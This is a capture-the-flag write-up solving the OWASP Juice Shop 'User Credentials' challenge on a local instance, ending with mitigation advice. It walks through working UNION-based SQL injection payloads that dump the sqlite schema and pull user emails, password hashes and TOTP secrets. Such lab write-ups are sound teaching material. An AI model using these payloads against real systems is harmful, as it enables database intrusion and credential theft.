# User Credentials

| Item | Detail |
|---|---|
| Category | Injection → SQL Injection |
| Difficulty | Hard (4-Star) |
| Juice Shop Flag | `score-board#User Credentials` |
| Tools Used | Browser DevTools (Network / Console) |
| Status | Solved |
| Video Demo | [Click Here](https://somup.com/cOfDVJVcPJy) |

---

## 1. Vulnerability Overview

The application provides a product search feature that sends requests to:

```
/rest/products/search?q=<input>
```

User input is directly inserted into a SQL query **without sanitization or parameterization**.

This allows an attacker to inject SQL code and extract sensitive data from the database using **UNION-based SQL Injection**.

---

## 2. Why This Challenge Is Tricky

- The UI often shows **"No results found"**, even when the attack works  
- The real data is only visible in the **Network response (JSON)**  
- You must match the correct number of columns (**9**)  
- You need basic knowledge of **SQLite internals (sqlite_master)**  

---

## 3. Step-by-Step Exploitation

### 1. Find the real API endpoint

Search in the UI (e.g., "apple") and check DevTools → Network.

You will find:

```
/rest/products/search?q=apple
```

👉 This is the real injection point (not the UI route `/#/search`).

---

### 2. Test for SQL Injection

Open in browser:

```
http://localhost:3000/rest/products/search?q='
```

👉 If you see an error → SQL Injection confirmed.

---

### 3. Break the original query

Use:

```
'))--
```

Example:

```
http://localhost:3000/rest/products/search?q='))--
```

👉 This returns all products → confirms control over query.

---

### 4. Find correct column count

Try:

```
')) UNION SELECT 1,2,3,4,5,6,7,8,9 --
```

👉 Works → table has **9 columns**

---

### 5. Discover database structure

Use SQLite system table:

```
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table' --
```

👉 This reveals table schemas, including **Users**

---

### 6. Extract user credentials

Now query the Users table:

```
')) UNION SELECT id,email,password,role,isActive,username,createdAt,deletedAt,totpSecret FROM Users --
```

Full URL (encoded if needed):

```
http://localhost:3000/rest/products/search?q='))%20UNION%20SELECT%20id,email,password,role,isActive,username,createdAt,deletedAt,totpSecret%20FROM%20Users--
```

---

### 7. View the result

👉 Open DevTools → Network → Response

You will see:

- emails  
- password hashes  
- roles  

Example:

```
admin@juice-sh.op
bender@juice-sh.op
jim@juice-sh.op
```

---

### 8. Challenge Completion

Once user credentials appear in the response → challenge solved.

---

## 4. Why This Works

The backend builds queries like:

```sql
SELECT * FROM Products WHERE name LIKE '%input%'
```

Because input is directly inserted:

- attacker closes query → `'))`
- injects new query → `UNION SELECT ...`
- comments rest → `--`

The database executes both queries → returns combined data.

---

## 5. Security Impact

- Exposure of all user credentials  
- Potential account takeover  
- Full database compromise  
- Sensitive data leakage (roles, secrets, etc.)

---

## 6. Mitigation

- Use **parameterized queries / prepared statements**
- Never concatenate user input into SQL
- Hide database errors from users
- Validate input properly

---

## 7. Key Takeaways

- SQL Injection is still one of the most critical vulnerabilities  
- UI may hide results → always check Network responses  
- UNION attacks require matching column count  
- Never trust user input  